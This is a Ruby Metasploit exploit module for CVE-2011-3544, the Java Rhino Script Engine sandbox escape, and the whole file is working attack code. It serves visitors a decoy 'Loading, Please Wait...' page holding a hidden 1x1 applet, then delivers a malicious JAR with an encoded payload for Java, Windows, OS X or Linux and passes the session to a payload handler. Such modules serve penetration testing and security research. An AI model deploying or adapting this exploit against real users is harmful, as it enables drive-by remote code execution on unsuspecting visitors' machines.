# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
require &#039;rex&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize( info = {} )
        super( update_info( info,
            &#039;Name&#039;          => &#039;Java Applet Rhino Script Engine Remote Code Execution&#039;,
            &#039;Description&#039;   => %q{
                    This module exploits a vulnerability in the Rhino Script Engine that
                can be used by a Java Applet to run arbitrary Java code outside of
                the sandbox.  The vulnerability affects version 7 and version 6 update
                27 and earlier, and should work on any browser that supports Java
                (for example: IE, Firefox, Google Chrome, etc)
            },
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Author&#039;        =>
                [
                    &#039;Michael Schierl&#039;, # Discovery
                    &#039;juan vazquez&#039;,    # metasploit module
                    &#039;Edward D. Teach <teach@consortium-of-pwners.net>&#039;,
                    &#039;sinn3r&#039;
                ],
            &#039;References&#039;    =>
                [
                    [ &#039;CVE&#039;, &#039;2011-3544&#039; ],
                    [ &#039;OSVDB&#039;, &#039;76500&#039; ], # 76500 and 76499 have contents mixed
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-305/&#039; ],
                    [ &#039;URL&#039;, &#039;http://schierlm.users.sourceforge.net/CVE-2011-3544.html&#039; ],
                ],
            &#039;Platform&#039;      => [ &#039;java&#039;, &#039;win&#039;, &#039;linux&#039; ],
            &#039;Payload&#039;       => { &#039;Space&#039; => 20480, &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
            &#039;Targets&#039;       =>
                [
                    [ &#039;Generic (Java Payload)&#039;,
                        {
                            &#039;Arch&#039; => ARCH_JAVA,
                        }
                    ],
                    [ &#039;Windows Universal&#039;,
                        {
                            &#039;Arch&#039; => ARCH_X86,
                            &#039;Platform&#039; => &#039;win&#039;
                        }
                    ],
                    [ &#039;Apple OSX&#039;,
                        {
                            &#039;ARCH&#039; => ARCH_X86,
                            &#039;Platform&#039; => &#039;osx&#039;
                        }
                    ],
                    [ &#039;Linux x86&#039;,
                        {
                            &#039;Arch&#039; => ARCH_X86,
                            &#039;Platform&#039; => &#039;linux&#039;
                        }
                    ]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Oct 18 2011&#039;
            ))
    end
 
 
    def on_request_uri( cli, request )
        if not request.uri.match(/\.jar$/i)
            if not request.uri.match(/\/$/)
                send_redirect(cli, get_resource() + &#039;/&#039;, &#039;&#039;)
                return
            end
 
            print_status("#{self.name} handling request from #{cli.peerhost}:#{cli.peerport}...")
 
            send_response_html( cli, generate_html, { &#039;Content-Type&#039; => &#039;text/html&#039; } )
            return
        end
 
        paths = [
            [ "Exploit.class" ]
        ]
 
        p = regenerate_payload(cli)
 
        jar  = p.encoded_jar
        paths.each do |path|
            1.upto(path.length - 1) do |idx|
                full = path[0,idx].join("/") + "/"
                if !(jar.entries.map{|e|e.name}.include?(full))
                    jar.add_file(full, &#039;&#039;)
                end
            end
            fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "cve-2011-3544", path ), "rb")
            data = fd.read(fd.stat.size)
            jar.add_file(path.join("/"), data)
            fd.close
        end
 
        print_status( "Sending Applet.jar to #{cli.peerhost}:#{cli.peerport}..." )
        send_response( cli, jar.pack, { &#039;Content-Type&#039; => "application/octet-stream" } )
 
        handler( cli )
    end
 
    def generate_html
        html  = "<html><head><title>Loading, Please Wait...</title></head>"
        html += "<body><center><p>Loading, Please Wait...</p></center>"
        html += "<applet archive=\"Exploit.jar\" code=\"Exploit.class\" width=\"1\" height=\"1\">"
        html += "</applet></body></html>"
        return html
    end
 
end



